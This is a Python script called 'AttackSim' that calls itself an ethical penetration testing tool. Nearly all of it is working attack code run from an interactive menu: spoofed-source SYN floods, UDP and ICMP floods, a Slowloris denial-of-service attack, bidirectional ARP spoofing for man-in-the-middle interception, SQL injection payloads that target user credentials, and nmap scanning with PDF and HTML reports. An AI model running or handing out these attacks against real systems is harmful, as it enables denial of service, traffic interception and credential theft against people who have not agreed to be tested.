#!/usr/bin/env python3
"""
Author: Sviatoslav 
Description: Professional Penetration Testing Tool for Ethical Hacking & Security Research.
Disclaimer: For authorized testing only. Unauthorized use is illegal.

"""
import os
import time
import threading
import socket
import nmap
import requests
import random
from scapy.all import *
from fpdf import FPDF
from datetime import datetime

stop_attack = False
report_data = {}
attack_threads = []

def generate_pdf():
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="AttackSim Report", ln=1, align="C")
    for k, v in report_data.items():
        if isinstance(v, list):
            v = ', '.join(map(str, v))
        pdf.multi_cell(0, 10, txt=f"{k}: {v}")
    filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
    pdf.output(filename)
    print(f"\n[+] PDF report saved as {filename}")

def generate_html():
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
    html_content = f"""<!DOCTYPE html>
<html><head><title>AttackSim Report</title>
<style>body {{ font-family: Arial, sans-serif; margin: 20px; }}
h1 {{ color: #333; }}.finding {{ margin-bottom: 15px; padding: 10px; background: #f5f5f5; }}
.timestamp {{ color: #666; font-size: 0.9em; }}</style></head>
<body><h1>AttackSim Report</h1><div class="timestamp">Generated: {timestamp}</div>"""
    for k, v in report_data.items():
        if isinstance(v, list):
            v = '<br>'.join(map(str, v))
        html_content += f"""<div class="finding"><strong>{k}:</strong><br>{v}</div>"""
    html_content += "</body></html>"
    with open(filename, 'w') as f:
        f.write(html_content)
    print(f"\n[+] HTML report saved as {filename}")

def syn_flood(target_ip, target_port, packet_count):
    global stop_attack
    print(f"[+] SYN Flooding {target_ip}:{target_port}")
    for _ in range(int(packet_count)):
        if stop_attack: return
        send(IP(src=RandIP(), dst=target_ip)/TCP(sport=RandShort(), dport=int(target_port), flags='S'), verbose=0)
    print("[+] SYN Flood completed")

def udp_flood(target_ip, target_port, packet_count):
    global stop_attack
    print(f"[+] UDP Flooding {target_ip}:{target_port}")
    for _ in range(int(packet_count)):
        if stop_attack: return
        send(IP(dst=target_ip)/UDP(sport=RandShort(), dport=int(target_port))/Raw(load=os.urandom(1024)), verbose=0)
    print("[+] UDP Flood completed")

def icmp_flood(target_ip, packet_count):
    global stop_attack
    print(f"[+] ICMP Flooding {target_ip}")
    for _ in range(int(packet_count)):
        if stop_attack: return
        send(IP(dst=target_ip)/ICMP(), verbose=0)
    print("[+] ICMP Flood completed")

def slowloris(target_ip, target_port, socket_count):
    global stop_attack
    print(f"[+] Slowloris attacking {target_ip}:{target_port}")
    sockets = []
    for _ in range(int(socket_count)):
        if stop_attack: return
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, int(target_port)))
            s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
            s.send("User-Agent: Mozilla/4.0\r\n".encode())
            sockets.append(s)
        except: pass
    while not stop_attack:
        for s in sockets:
            try: s.send("X-a: b\r\n".encode())
            except: sockets.remove(s)
        time.sleep(15)
    print("[!] Slowloris stopped")

def arp_spoof(target_ip, gateway_ip):
    global stop_attack
    print(f"[+] ARP Spoofing {target_ip} <-> {gateway_ip}")
    while not stop_attack:
        send(ARP(op=2, pdst=target_ip, psrc=gateway_ip), verbose=0)
        send(ARP(op=2, pdst=gateway_ip, psrc=target_ip), verbose=0)
        time.sleep(2)
    print("[!] ARP Spoofing stopped")

def sql_injection(url):
    print(f"[+] Testing SQL Injection on {url}")
    payloads = ["' OR '1'='1", "' UNION SELECT null,username,password FROM users--"]
    for payload in payloads:
        try:
            r = requests.get(f"{url}?id={payload}", timeout=5)
            if "error in your SQL" in r.text.lower():
                report_data['SQLi'] = f"Vulnerable to: {payload}"
                return True
        except: pass
    print("[-] No SQLi vulnerabilities found")
    return False

def port_scan(target_ip, report_format):
    print(f"\n[+] Scanning {target_ip}...")
    scanner = nmap.PortScanner()
    try:
        scanner.scan(target_ip, arguments='-sS -T4 -F')
        open_ports = []
        for host in scanner.all_hosts():
            if 'tcp' in scanner[host]:
                for port in scanner[host]['tcp']:
                    service = scanner[host]['tcp'][port]['name']
                    state = scanner[host]['tcp'][port]['state']
                    open_ports.append(f"Port {port} ({service}): {state}")
        if open_ports:
            report_data['Port Scan'] = open_ports
            if report_format == '1': generate_pdf()
            elif report_format == '2': generate_html()
        else: print("[-] No open ports found")
    except Exception as e: print(f"[-] Scan failed: {e}")

def stop_attacks():
    global stop_attack, attack_threads
    stop_attack = True
    for t in attack_threads: t.join()
    attack_threads = []
    print("[!] All attacks stopped")
    stop_attack = False

def main():
    global stop_attack, attack_threads
    while True:
        print("\n" + "="*40)
        print("AttackSim - Interactive Attack Simulator")
        print("="*40)
        print("1. Network-Based Attacks")
        print("2. Web Application Attacks")
        print("3. Credential & MITM Attacks")
        print("4. Reconnaissance")
        print("5. Stop all attacks")
        print("6. Exit")
        choice = input("\nEnter your choice (1-6): ")
        
        if choice == '6': stop_attacks(); break
        elif choice == '5': stop_attacks()
        
        elif choice == '1':
            print("\nNetwork-Based Attacks:")
            print("1. SYN Flood")
            print("2. UDP Flood")
            print("3. ICMP Flood")
            print("4. Slowloris")
            sub_choice = input("Select attack (1-4): ")
            target_ip = input("Target IP: ")
            
            if sub_choice in ['1', '2', '3']:
                packet_count = input("Number of packets: ")
                if sub_choice == '1':
                    target_port = input("Target port: ")
                    t = threading.Thread(target=syn_flood, args=(target_ip, target_port, packet_count))
                elif sub_choice == '2':
                    target_port = input("Target port: ")
                    t = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_count))
                elif sub_choice == '3':
                    t = threading.Thread(target=icmp_flood, args=(target_ip, packet_count))
            elif sub_choice == '4':
                target_port = input("Target port: ")
                socket_count = input("Number of sockets: ")
                t = threading.Thread(target=slowloris, args=(target_ip, target_port, socket_count))
            else: continue
            
            t.daemon = True
            t.start()
            attack_threads.append(t)
            print("[+] Attack started")
            
        elif choice == '3':
            print("\nMITM Attacks:")
            print("1. ARP Spoofing")
            sub_choice = input("Select attack (1): ")
            if sub_choice == '1':
                target_ip = input("Target IP: ")
                gateway_ip = input("Gateway IP: ")
                t = threading.Thread(target=arp_spoof, args=(target_ip, gateway_ip))
                t.daemon = True
                t.start()
                attack_threads.append(t)
                print("[+] ARP Spoofing started")
                
        elif choice == '2':
            print("\nWeb Application Attacks:")
            print("1. SQL Injection Test")
            sub_choice = input("Select attack (1): ")
            if sub_choice == '1':
                url = input("Target URL (e.g., http://site.com/login.php): ")
                sql_injection(url)
                
        elif choice == '4':
            print("\nReconnaissance:")
            print("1. Port Scan (PDF Report)")
            print("2. Port Scan (HTML Report)")
            sub_choice = input("Select scan (1-2): ")
            if sub_choice in ['1', '2']:
                target_ip = input("Target IP: ")
                port_scan(target_ip, sub_choice)

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        stop_attacks()
        print("\n[!] Forced exit")